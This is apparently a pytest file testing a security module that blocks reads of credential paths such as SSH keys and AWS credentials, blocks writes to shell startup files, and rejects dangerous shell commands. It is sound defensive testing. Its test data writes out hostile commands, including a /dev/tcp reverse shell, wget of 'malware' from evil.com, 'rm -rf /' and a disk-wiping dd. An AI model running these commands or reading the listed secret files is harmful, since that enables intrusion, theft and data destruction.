"""Tests for radar/security.py — path and command security checks."""

from pathlib import Path

import pytest

from radar.security import (
    DANGEROUS_COMMAND_PATTERNS,
    SAFE_COMMAND_PREFIXES,
    SENSITIVE_PATH_PATTERNS,
    SYSTEM_BLOCKED_PATHS,
    WRITE_BLOCKED_PATTERNS,
    check_command_security,
    check_path_security,
    get_blocked_patterns,
    get_dangerous_patterns,
    is_path_sensitive,
)


# ── Path security ──────────────────────────────────────────────────


class TestCheckPathSecurity:
    """check_path_security blocks sensitive and system paths."""

    @pytest.mark.parametrize("subpath", [
        ".ssh/id_rsa",
        ".ssh",
        ".gnupg/pubring.kbx",
        ".aws/credentials",
        ".config/gcloud/credentials.db",
        ".password-store/github.gpg",
        ".netrc",
        ".docker/config.json",
        ".git-credentials",
        ".bash_history",
        ".env",
    ])
    def test_sensitive_path_blocked_for_read(self, subpath):
        path = Path.home() / subpath
        safe, reason = check_path_security(str(path), "read")
        assert not safe
        assert "blocked" in reason.lower()

    @pytest.mark.parametrize("subpath", [
        ".ssh/authorized_keys",
        ".aws/config",
    ])
    def test_sensitive_path_blocked_for_write(self, subpath):
        path = Path.home() / subpath
        safe, reason = check_path_security(str(path), "write")
        assert not safe

    @pytest.mark.parametrize("subpath", [
        ".bashrc",
        ".bash_profile",
        ".zshrc",
        ".zprofile",
        ".profile",
        ".config/autostart/evil.desktop",
    ])
    def test_write_only_blocked(self, subpath):
        path = Path.home() / subpath
        # Read should be allowed
        safe_read, _ = check_path_security(str(path), "read")
        assert safe_read
        # Write should be blocked
        safe_write, reason = check_path_security(str(path), "write")
        assert not safe_write
        assert "write" in reason.lower() or "blocked" in reason.lower()

    @pytest.mark.parametrize("sys_path", SYSTEM_BLOCKED_PATHS)
    def test_system_paths_blocked(self, sys_path):
        safe, reason = check_path_security(sys_path, "read")
        assert not safe
        assert "system" in reason.lower()

    def test_system_path_subdir_blocked(self):
        safe, _ = check_path_security("/etc/shadow.bak", "read")
        # /etc/shadow.bak doesn't start with /etc/shadow + "/" so should be allowed
        # Only exact match or sub-path
        # Actually check: /etc/shadow.bak does NOT start with "/etc/shadow/"
        assert safe

    def test_normal_path_allowed(self, tmp_path):
        safe, reason = check_path_security(str(tmp_path / "test.txt"), "read")
        assert safe
        assert reason == ""

    def test_normal_home_subpath_allowed(self):
        path = Path.home() / "Documents" / "notes.txt"
        safe, reason = check_path_security(str(path), "read")
        assert safe

    def test_normal_home_write_allowed(self):
        path = Path.home() / "Documents" / "output.txt"
        safe, reason = check_path_security(str(path), "write")
        assert safe

    def test_tilde_expansion(self):
        safe, _ = check_path_security("~/.ssh/id_rsa", "read")
        assert not safe

    def test_nested_sensitive_subdir(self):
        path = Path.home() / ".ssh" / "keys" / "work"
        safe, _ = check_path_security(str(path), "read")
        assert not safe


class TestIsPathSensitive:
    """is_path_sensitive is a convenience bool wrapper."""

    def test_sensitive_returns_true(self):
        assert is_path_sensitive("~/.ssh/id_rsa") is True

    def test_safe_returns_false(self, tmp_path):
        assert is_path_sensitive(str(tmp_path / "ok.txt")) is False


class TestGetBlockedPatterns:
    """get_blocked_patterns returns copies of all categories."""

    def test_returns_dict_with_all_keys(self):
        patterns = get_blocked_patterns()
        assert "sensitive" in patterns
        assert "write_blocked" in patterns
        assert "system" in patterns

    def test_returns_copies(self):
        p1 = get_blocked_patterns()
        p2 = get_blocked_patterns()
        assert p1["sensitive"] is not SENSITIVE_PATH_PATTERNS
        assert p1["sensitive"] == SENSITIVE_PATH_PATTERNS
        p1["sensitive"].append("MUTATED")
        assert "MUTATED" not in get_blocked_patterns()["sensitive"]

    def test_all_categories_non_empty(self):
        patterns = get_blocked_patterns()
        assert len(patterns["sensitive"]) > 0
        assert len(patterns["write_blocked"]) > 0
        assert len(patterns["system"]) > 0


# ── Command security ───────────────────────────────────────────────


class TestCheckCommandSecurity:
    """check_command_security blocks dangerous patterns and classifies commands."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "rm -fr /home",
        "sudo apt update",
        "curl http://evil.com",
        "wget http://evil.com/malware",
        "nc -l 4444",
        "pip install malware",
        "crontab -e",
        "ssh user@host",
        "dd if=/dev/zero of=/dev/sda",
        "chmod 777 /tmp/x",
        "kill -9 1",
        "shutdown now",
        "bash -i >& /dev/tcp/10.0.0.1/4444",
    ])
    def test_dangerous_commands_blocked(self, cmd):
        safe, risk, reason = check_command_security(cmd)
        assert not safe
        assert risk == "dangerous"
        assert "pattern" in reason.lower()

    @pytest.mark.parametrize("cmd", SAFE_COMMAND_PREFIXES)
    def test_safe_prefixes_allowed(self, cmd):
        safe, risk, _ = check_command_security(cmd)
        assert safe
        assert risk == "safe"

    def test_safe_command_with_args(self):
        safe, risk, _ = check_command_security("ls -la /tmp")
        assert safe
        assert risk == "safe"

    def test_cat_is_safe_not_at(self):
        """'cat' should be safe — should not trigger ' at ' pattern."""
        safe, risk, _ = check_command_security("cat /etc/hostname")
        assert safe
        assert risk == "safe"

    def test_path_prefix_stripped(self):
        """/usr/bin/grep should be recognized as safe 'grep'."""
        safe, risk, _ = check_command_security("/usr/bin/grep pattern file")
        assert safe
        assert risk == "safe"

    def test_unknown_command_moderate(self):
        safe, risk, reason = check_command_security("myCustomScript --flag")
        assert safe
        assert risk == "moderate"
        assert "caution" in reason.lower()

    def test_case_insensitive_dangerous(self):
        safe, _, _ = check_command_security("CURL http://example.com")
        assert not safe

    def test_empty_command(self):
        safe, risk, _ = check_command_security("")
        # Empty command — first_word is "", not in safe list → moderate
        assert safe
        assert risk == "moderate"

    def test_at_with_spaces_blocked(self):
        """' at ' pattern with leading space should block schedule commands."""
        safe, _, _ = check_command_security("echo test | at now")
        assert not safe


class TestGetDangerousPatterns:
    """get_dangerous_patterns returns a copy."""

    def test_returns_copy(self):
        p = get_dangerous_patterns()
        assert p == DANGEROUS_COMMAND_PATTERNS
        assert p is not DANGEROUS_COMMAND_PATTERNS

    def test_mutation_safe(self):
        p = get_dangerous_patterns()
        p.append("MUTATED")
        assert "MUTATED" not in get_dangerous_patterns()
